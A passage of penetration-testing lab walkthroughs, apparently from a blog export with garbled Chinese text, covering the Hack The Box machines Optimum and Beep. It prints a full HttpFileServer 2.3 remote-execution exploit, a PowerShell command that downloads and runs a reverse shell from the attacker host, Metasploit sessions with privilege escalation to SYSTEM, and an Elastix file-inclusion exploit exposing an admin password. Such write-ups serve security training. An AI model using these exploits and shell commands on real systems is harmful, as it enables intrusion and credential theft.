ä¸ªå¼±å£ä»¤ï¼Œéƒ½æ²¡ç™»å½•è¿›å»ï¼Œçœ‹çœ‹å…¶ä»–æ–¹æ³•\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªHttpFileServer 2.3ï¼Œå»searchsploitä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´\n\n### Searchsploit\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]\nâ””â”€# searchsploit HttpFileServer 2.3\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nRejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                       | windows/webapps/49125.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nè¿™é‡Œç¡®å®æœ‰ä¸€ä¸ªRCEï¼Œæµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ç”¨\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]\nâ””â”€# cat CVE-2014-6287.py \n# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)\n# Google Dork: intext:\"httpfileserver 2.3\"\n# Date: 28-11-2020\n# Remote: Yes\n# Exploit Author: Ã“scar Andreu\n# Vendor Homepage: http://rejetto.com/\n# Software Link: http://sourceforge.net/projects/hfs/\n# Version: 2.3.x\n# Tested on: Windows Server 2008 , Windows 8, Windows 7\n# CVE : CVE-2014-6287\n\n#!/usr/bin/python3\n\n# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>\n# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 \"c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')\"\n\nimport urllib3\nimport sys\nimport urllib.parse\n\ntry:\n        http = urllib3.PoolManager()\n        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'\n        print(url)\n        response = http.request('GET', url)\n\nexcept Exception as ex:\n        print(\"Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command\")\n        print(ex)\n```\nå°è¯•æ‰§è¡Œä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]\nâ””â”€# python3 CVE-2014-6287.py 10.10.10.8 80 whoami\nhttp://10.10.10.8:80/?search=%00{.+exec|whoami.}\n```\nè¿™é‡Œæ²¡æœ‰ç»™æˆ‘ä»»ä½•å›æ˜¾ï¼Œæˆ‘ä¸ç¡®å®šæ˜¯å¦æ‰§è¡ŒæˆåŠŸäº†ï¼Œå»æµ‹è¯•ä¸€ä¸‹å§\n\næœ¬åœ°ä½¿ç”¨tcpdumpç›‘å¬ä¸€ä¸‹ç½‘å¡ï¼Œç„¶åæ‰§è¡Œä¸€ä¸‹pingæˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]\nâ””â”€# python3 CVE-2014-6287.py 10.10.10.8 80 \"ping 10.10.16.3\"\nhttp://10.10.10.8:80/?search=%00{.+exec|ping%2010.10.16.3.}\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# tcpdump -i tun0     \ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n23:25:22.516278 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [S], seq 2814804000, win 64240, options [mss 1460,sackOK,TS val 3571996960 ecr 0,nop,wscale 7], length 0\n23:25:22.747740 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [S.], seq 3736611079, ack 2814804001, win 8192, options [mss 1355,nop,wscale 8,sackOK,TS val 122838 ecr 3571996960], length 0\n23:25:22.747788 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 0\n23:25:22.747968 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [P.], seq 1:143, ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 142: HTTP: GET /?search=%00%7B.+exec%7Cping%2010.10.16.3.%7D HTTP/1.1\n23:25:23.203303 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [P.], seq 1:219, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 218: HTTP: HTTP/1.1 200 OK\n23:25:23.203352 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 219, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0\n23:25:23.203376 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [.], seq 219:1562, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP\n23:25:23.203381 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 1562, win 498, options [nop,nop,TS val 3571997647 ecr 122884], length 0\n23:25:23.204028 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [P.], seq 1562:1679, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 117: HTTP\n23:25:23.204036 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 1679, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0\n23:25:23.434280 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [.], seq 1679:3022, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP\n23:25:23.434317 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 3022, win 501, options [nop,nop,TS val 3571997878 ecr 122884], length 0\n23:25:23.434339 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [P.], seq 3022:3139, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 117: HTTP\n23:25:23.434346 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 3139, win 501, options [nop,nop,TS val 3571997878 ecr 122884], length 0\n23:25:23.434354 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [P.], seq 3139:4164, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1025: HTTP\n23:25:23.434359 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 4164, win 498, options [nop,nop,TS val 3571997878 ecr 122884], length 0\n23:25:23.437193 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [F.], seq 143, ack 4164, win 501, options [nop,nop,TS val 3571997881 ecr 122884], length 0\n23:25:23.879455 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [.], ack 144, win 257, options [nop,nop,TS val 122953 ecr 3571997881], length 0\n23:25:24.151025 IP 10.10.10.8.http > 10.10.16.3.35656: Flags [F.], seq 4164, ack 144, win 257, options [nop,nop,TS val 122953 ecr 3571997881], length 0\n23:25:24.151044 IP 10.10.16.3.35656 > 10.10.10.8.http: Flags [.], ack 4165, win 501, options [nop,nop,TS val 3571998595 ecr 122953], length 0\n23:25:47.421881 IP 10.10.16.3.33237 > 239.255.255.250.1900: UDP, length 172\n23:25:48.422841 IP 10.10.16.3.33237 > 239.255.255.250.1900: UDP, length 172\n23:25:49.424354 IP 10.10.16.3.33237 > 239.255.255.250.1900: UDP, length 172\n23:25:50.425946 IP 10.10.16.3.33237 > 239.255.255.250.1900: UDP, length 172\n```\nç¡®å®æ˜¯æˆåŠŸè¢«æ‰§è¡Œäº†ï¼Œé‚£å°±å¯ä»¥ç¡®è®¤è¯¥æ¼æ´æ˜¯å­˜åœ¨ï¼Œå¹¶ä¸”exploitä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„\n\n## æ¼æ´åˆ©ç”¨\n### æ–¹æ³• 1\næ—¢ç„¶çŸ¥é“äº†ä»€ä¹ˆæ¼æ´å¯ä»¥ç”¨ï¼Œé‚£å°±ç®€å•äº†ï¼Œæ¥æ„é€ POCå§\n\næ ¹æ®CVE-2014-6287çš„æç¤ºï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä½¿ç”¨powershellè¿›è¡Œå›å¼¹ä¸€ä¸ªshellï¼Œå’±ä»¬æ‰¾ä¸€ä¸ªpowershellçš„åˆ©ç”¨å·¥å…·\n\n> [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)\n\næˆ‘è¿™è¾¹æ˜¯æ‰¾åˆ°ä¸€ä¸ªè„šæœ¬ï¼Œå’±ä»¬ç»™ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åå»å°è¯•æ‰§è¡Œ\n\nç„¶åç¨å¾®ä¿®æ”¹ä¸€ä¸‹\n\n```bash\nInvoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444\n```\næˆ‘ä»¬å°†è¿™å¥ä»£ç å¤åˆ¶ä¸‹æ¥ï¼Œç²˜è´´åˆ°ä»£ç æœ€åº•éƒ¨ï¼Œç„¶åæŠŠIPä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„IP\n\nç„¶ååœ¨æœ¬åœ°ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡\n\n```bash\npython3 -m http.server 80\n```\nç„¶åä½¿ç”¨expè¿›è¡Œä¸‹è½½\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Optimum]\nâ””â”€# python3 CVE-2014-6287.py 10.10.10.8 80 \"c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3/Invoke-PowerShellTcp.ps1')\"\nhttp://10.10.10.8:80/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.16.3/Invoke-PowerShellTcp.ps1%27%29.}\n```\n```bash\nPS C:\\Users\\kostas\\Desktop> whoami\noptimum\\kostas\n```\næˆåŠŸå¾—åˆ°äº†shell\n\n### æ–¹æ³• 2\n```bash\nmsf6 > search HttpFileServer 2.3\n\nMatching Modules\n================\n\n   #  Name                                   Disclosure Date  Rank       Check  Description\n   -  ----                                   ---------------  ----       -----  -----------\n   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec\n\nmsf6 > use 0\n[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp\nmsf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\n```\nmsfconsoleå¯ä»¥ç›´æ¥ä½¿ç”¨\n\n```bash\nmsf6 exploit(windows/http/rejetto_hfs_exec) > show options \n\nModule options (exploit/windows/http/rejetto_hfs_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   HTTPDELAY  10               no        Seconds to wait before terminating web server\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     10.10.10.8       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      80               yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                yes       The path of the web application\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   VHOST                       no        HTTP server virtual host\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.3       yes       The listen address (an interface may be specified)\n   LPORT     5555             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n```\nè®¾ç½®å¥½ç›¸å…³é…ç½®ï¼Œç„¶åæ‰§è¡Œ\n\n```bash\nmsf6 exploit(windows/http/rejetto_hfs_exec) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.3:5555 \n[*] Using URL: http://0.0.0.0:8080/zKFWDMqMmVKxA\n[*] Local IP: http://192.168.200.128:8080/zKFWDMqMmVKxA\n[*] Server started.\n[*] Sending a malicious request to /\n[*] Payload request received: /zKFWDMqMmVKxA\n[*] Sending stage (175174 bytes) to 10.10.10.8\n[!] Tried to delete %TEMP%\\UZMLMeDqW.vbs, unknown result\n[*] Meterpreter session 1 opened (10.10.16.3:5555 -> 10.10.10.8:49178) at 2022-03-10 00:02:29 -0500\n[*] Server stopped.\n\nmeterpreter > getuid\nServer username: OPTIMUM\\kostas\nmeterpreter > sysinfo\nComputer        : OPTIMUM\nOS              : Windows 2012 R2 (6.3 Build 9600).\nArchitecture    : x64\nSystem Language : el_GR\nDomain          : HTB\nLogged On Users : 1\nMeterpreter     : x86/windows\n```\nè¿™è¾¹ä¹ŸæˆåŠŸæ‹¿åˆ°äº†shell\n\n## æƒé™æå‡\nä½¿ç”¨systeminfoæˆ–å…¶ä»–æ–¹å¼éƒ½å¯ä»¥çœ‹åˆ°è¡¥ä¸ä¿¡æ¯\n\nå»æœæŸ¥è¡¥ä¸ä¿¡æ¯ï¼Œæˆ–æ˜¯ä½¿ç”¨msfçš„ææƒè¾…åŠ©è„šæœ¬éƒ½å¯ä»¥çŸ¥é“\n\nè¿™è¾¹MSFæœ‰ä¸ªææƒå¯ç”¨è„šæœ¬\n\n```bash\nuse windows/local/ms16_032_secondary_logon_handle_privesc\nset SESSION 1\nexploit\n```\n```bash\nmsf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.3:4444 \n[+] Compressed size: 1016\n[*] Writing payload file, C:\\Users\\kostas\\AppData\\Local\\Temp\\IQyTwKukUqs.ps1...\n[*] Compressing script contents...\n[+] Compressed size: 3588\n[*] Executing exploit script...\n         __ __ ___ ___   ___     ___ ___ ___ \n        |  V  |  _|_  | |  _|___|   |_  |_  |\n        |     |_  |_| |_| . |___| | |_  |  _|\n        |_|_|_|___|_____|___|   |___|___|___|\n\n                       [by b33f -> @FuzzySec]\n\n[?] Operating system core count: 2\n[>] Duplicating CreateProcessWithLogonW handle\n[?] Done, using thread handle: 1936\n\n[*] Sniffing out privileged impersonation token..\n\n[?] Thread belongs to: svchost\n[+] Thread suspended\n[>] Wiping current impersonation token\n[>] Building SYSTEM impersonation token\n[?] Success, open SYSTEM token handle: 2024\n[+] Resuming thread..\n\n[*] Sniffing out SYSTEM shell..\n\n[>] Duplicating SYSTEM token\n[>] Starting token race\n[>] Starting process race\n[!] Holy handle leak Batman, we have a SYSTEM shell!!\n\nxQiD0FWfxy0Q3rUwptuxobxZ7Fk20m8U\n[+] Executed on target machine.\n[*] Sending stage (200262 bytes) to 10.10.10.8\n[*] Meterpreter session 2 opened (10.10.16.3:4444 -> 10.10.10.8:49188) at 2022-03-10 00:34:05 -0500\n[+] Deleted C:\\Users\\kostas\\AppData\\Local\\Temp\\IQyTwKukUqs.ps1\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\næˆåŠŸæ‹¿åˆ°systemæƒé™\n\n```bash\nmeterpreter > search -f user.txt.txt\nFound 1 result...\n    c:\\Users\\kostas\\Desktop\\user.txt.txt (32 bytes)\nmeterpreter > cat 'c:\\Users\\kostas\\Desktop\\user.txt.txt'\nd0c39409d7b994a9a1389ebf38ef5f73\n```\n```bash\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Users\\Administrator\\Desktop\\root.txt (32 bytes)\nmeterpreter > cat 'c:\\Users\\Administrator\\Desktop\\root.txt'\n51ed1b36553c8461f4552c2e92b3eeed\n```\næˆåŠŸæ‹¿åˆ°userå’Œrootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Beep - Hackthebox","url":"/2022/03/09/Hackthebox/Easy/Hackthebox-Beep/","content":"\n# Hackthebox - Beep\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Beep/cc3689db-67a4-4544-82f9-b0aabeb80f7c.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Beep/d82d05cf-780c-4857-93e6-4891dab2a9af.png)\n\n## ä¿¡æ¯æœé›†\n### Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Beep]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.7       \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-04 00:36 EST\nNmap scan report for 10.10.10.7\nHost is up (6.6s latency).\nNot shown: 64293 filtered ports, 1232 closed ports\nPORT     STATE SERVICE    VERSION\n22/tcp   open  tcpwrapped\n| ssh-hostkey: \n|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)\n|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)\n25/tcp   open  tcpwrapped\n|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, \n80/tcp   open  tcpwrapped\n|_http-server-header: Apache/2.2.3 (CentOS)\n|_http-title: Did not follow redirect to https://10.10.10.7/\n110/tcp  open  tcpwrapped\n|_pop3-capabilities: STLS PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) RESP-CODES EXPIRE(NEVER) LOGIN-DELAY(0) TOP UIDL USER AUTH-RESP-CODE APOP\n111/tcp  open  tcpwrapped\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1            875/udp   status\n|_  100024  1            878/tcp   status\n143/tcp  open  tcpwrapped\n|_imap-capabilities: THREAD=ORDEREDSUBJECT NAMESPACE OK MULTIAPPEND X-NETSCAPE QUOTA NO URLAUTHA0001 LISTEXT LIST-SUBSCRIBED CATENATE BINARY ID IDLE RIGHTS=kxte ANNOTATEMORE STARTTLS IMAP4 SORT=MODSEQ Completed IMAP4rev1 ACL UNSELECT RENAME UIDPLUS ATOMIC THREAD=REFERENCES MAILBOX-REFERRALS LITERAL+ CONDSTORE SORT CHILDREN\n443/tcp  open  tcpwrapped\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2017-04-07T08:22:08\n|_Not valid after:  2018-04-07T08:22:08\n|_ssl-date: 2022-03-04T06:40:08+00:00; +59m59s from scanner time.\n993/tcp  open  tcpwrapped\n|_imap-capabilities: CAPABILITY\n995/tcp  open  tcpwrapped\n3306/tcp open  tcpwrapped\n|_sslv2: ERROR: Script execution failed (use -d to debug)\nDevice type: firewall\nRunning (JUST GUESSING): Fortinet embedded (87%)\nOS CPE: cpe:/h:fortinet:fortigate_100d\nAggressive OS guesses: Fortinet FortiGate 100D firewall (87%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 4 hops\n\nHost script results:\n|_clock-skew: 59m55s\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT        ADDRESS\n1   5559.01 ms 10.10.16.1\n2   ... 3\n4   5559.05 ms 10.10.10.7\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 460.47 seconds\n```\n### Http\nå…ˆæ¥çœ‹çœ‹80ç«¯å£çš„webæœåŠ¡\n\n![](Hackthebox-Beep/2f3a5383-ded3-4a6e-b4ee-b56f6c7448f3.png)\n\næ˜¯ä¸€ä¸ªElastixçš„ç³»ç»Ÿï¼Œå»æœæœçœ‹æ˜¯å¦æœ‰æ¼æ´\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit elastix                   \n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nElastix - 'page' Cross-Site Scripting                                                                                                                                             | php/webapps/38078.py\nElastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                           | php/webapps/38544.txt\nElastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                     | php/webapps/34942.txt\nElastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                                                  | php/webapps/37637.pl\nElastix 2.x - Blind SQL Injection                                                                                                                                                 | php/webapps/36305.txt\nElastix < 2.5 - PHP Code Injection                                                                                                                                                | php/webapps/38091.php\nFreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                            | php/webapps/18650.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªæ¼æ´ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯LFIï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼‰ï¼Œå»çœ‹çœ‹ç›¸å…³æ¼æ´å†…å®¹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# locate php/webapps/37637.pl\n/usr/share/exploitdb/exploits/php/webapps/37637.pl\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat /usr/share/exploitdb/exploits/php/webapps/37637.pl\nsource: https://www.securityfocus.com/bid/55078/info\n\nElastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.\n\nAn attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.\n\nElastix 2.2.0 is vulnerable; other versions may also be affected. \n\n#!/usr/bin/perl -w\n\n#------------------------------------------------------------------------------------# \n#Elastix is an Open Source Sofware to establish Unified Communications. \n#About this concept, Elastix goal is to incorporate all the communication alternatives,\n#available at an enterprise level, into a unique solution.\n#------------------------------------------------------------------------------------#\n############################################################\n# Exploit Title: Elastix 2.2.0 LFI\n# Google Dork: :(\n# Author: cheki\n# Version:Elastix 2.2.0\n# Tested on: multiple\n# CVE : notyet\n# romanc-_-eyes ;) \n# Discovered by romanc-_-eyes\n# vendor http://www.elastix.org/\n\nprint \"\\t Elastix 2.2.0 LFI Exploit \\n\";\nprint \"\\t code author cheki   \\n\";\nprint \"\\t 0day Elastix 2.2.0  \\n\";\nprint \"\\t email: anonymous17hacker{}gmail.com \\n\";\n\n#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action\n\nuse LWP::UserAgent;\nprint \"\\n Target: https://ip \";\nchomp(my $target=<STDIN>);\n$dir=\"vtigercrm\";\n$poc=\"current_language\";\n$etc=\"etc\";\n$jump=\"../../../../../../../..//\";\n$test=\"amportal.conf%00\";\n\n$code = LWP::UserAgent->new() or die \"inicializacia brauzeris\\n\";\n$code->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\n$host = $target . \"/\".$dir.\"/graph.php?\".$poc.\"=\".$jump.\"\".$etc.\"/\".$test.\"&module=Accounts&action\";\n$res = $code->request(HTTP::Request->new(GET=>$host));\n$answer = $res->content; if ($answer =~ 'This file is part of FreePBX') {\n\nprint \"\\n read amportal.conf file : $answer \\n\\n\";\nprint \" successful read\\n\";\n\n}\nelse { \nprint \"\\n[-] not successful\\n\";\n        }\n```\n## æ¼æ´åˆ©ç”¨\næ ¹æ®Exploitä¸­æåˆ°çš„ï¼Œæ„é€ ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–çš„Payload\n\n```bash\nview-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action\n```\n![](Hackthebox-Beep/d26765f5-20c7-4005-83a8-1d66a513cb38.png)\n\næˆåŠŸè¯»å–åˆ°ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = admin\npassword = jEhdIekWmdjE\n```\næˆ‘ä»¬å»å°è¯•ç™»å½•ä¸€ä¸‹\n\n![](Hackthebox-Beep/f457f5cd-5496-4784-a724-93f1f240e343.png)\n\nç™»å…¥åä¼¼ä¹æ˜¯ä¸€ä¸ªä»ªè¡¨ç›˜ï¼Œä½†æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„\n\n![](Hackthebox-Beep/dae9ef78-668f-409f-ac5b-bad9f4e0dbaa.png)\n\nç»è¿‡å°è¯•åå‘ç°/adminç›®å½•æ˜¯ä¸€ä¸ªå¦å¤–çš„ç™»å½•å£ï¼Œä¹Ÿå¯ä½¿ç”¨è¿™ä¸ªè´¦å·å¯†ç è¿›è¡Œç™»å½•\n\nä½†ç™»å…¥åä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆæ˜æ˜¾çš„åˆ©ç”¨ç‚¹\n\nè¿™è¾¹å€’æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨sshè¿›è¡Œç™»å½•ï¼Œå…ˆç»™å¤§å®¶æ¼”ç¤ºä¸€ä¸‹ç›´æ¥ç™»å½•çš„æ–¹æ³•ï¼Œå†æ¼”ç¤ºå…¶ä»–çš„åˆ©ç”¨æ–¹å¼\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh root@10.10.10.7                                                       \nUnable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\n```\nè¿™è¾¹æç¤ºéœ€è¦æŒ‡å®škexç®—æ³•ï¼Œå»æŒ‡å®šä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh root@10.10.10.7 -o KexAlgorithms=diffie-hellman-group1-sha1                                                                                                                                           255 â¨¯\nThe authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.\nRSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.\nroot@10.10.10.7's password: \nLast login: Tue Jul 16 11:45:47 2019\n\nWelcome to Elastix \n----------------------------------------------------\n\nTo access your Elastix System, using a separate workstation (PC/MAC/Linux)\nOpen the Internet Browser using the following URL:\nhttp://10.10.10.7\n\n[root@beep ~]# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\nå¯ä»¥ç›´æ¥ä½¿ç”¨ç½‘é¡µä¸­è·å–åˆ°çš„å¯†ç è¿›è¡Œç™»å½•ï¼Œä¸è¿‡è¿™ç§çŒœå¯†ç æ˜¯å¦å¯ä»¥åˆ©ç”¨çš„æ–¹å¼æ˜¾ç„¶ä¸ç¬¦åˆæˆ‘çš„æƒ³æ³•ï¼Œè¿˜æ˜¯å¾—æµ‹è¯•æ¼æ´\n\n![](Hackthebox-Beep/94e68a76-7657-4b88-9493-b1caab5ab50e.png)\n\nè¿›å…¥https://10.10.10.7/adminç„¶åå–æ¶ˆç™»å½•æ¡†ï¼Œå³å¯çœ‹åˆ°FreePBXçš„ç‰ˆæœ¬ï¼Œå»searchspolitä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit FreePBX\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nFreePBX - 'config.php' Remote Code Execution (Metasploit)                                                                                                                         | unix/remote/32512.rb\nFreePBX 13 - Remote Command Execution / Privilege Escalation                                                                                                                      | php/webapps/40614.py\nFreePBX 13.0.35 - Remote Command Execution                                                                                                                                        | php/webapps/40296.txt\nFreePBX 13.0.35 - SQL Injection                                                                                                                                                   | php/webapps/40312.txt\nFreePBX 13.0.x < 13.0.154 - Remote Command Execution                                                                                                                              | php/webapps/40345.txt\nFreePBX 13/14 - Remote Command Execution / Privilege Escalation                                                                                                                   | linux/remote/40232.py\nFreePBX 2.1.3 - 'upgrade.php' Remote File Inclusion                                                                                                                               | php/webapps/2665.txt\nFreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                            | php/webapps/18650.py\nFreePBX 2.11.0 - Remote Command Execution                                                                                                                                         | php/webapps/32214.pl\nFreePBX 2.2 - SIP Packet Multiple HTML Injection Vulnerabilities                                                                                                                  | multiple/remote/29873.php\nFreePBX 2.5.1 - SQL Injection                                                                                                                                                     | multiple/webapps/11186.txt\nFreePBX 2.5.2 - '/admin/config.php?tech' Cross-Site Scripting                                                                                                                     | php/webapps/33442.txt\nFreePBX 2.5.2 - Zap Channel Addition Description Parameter Cross-Site Scripting                                                                                                   | php/webapps/33443.txt\nFreePBX 2.5.x - Information Disclosure                                                                                                                                            | multiple/webapps/11187.txt\nFreePBX 2.5.x < 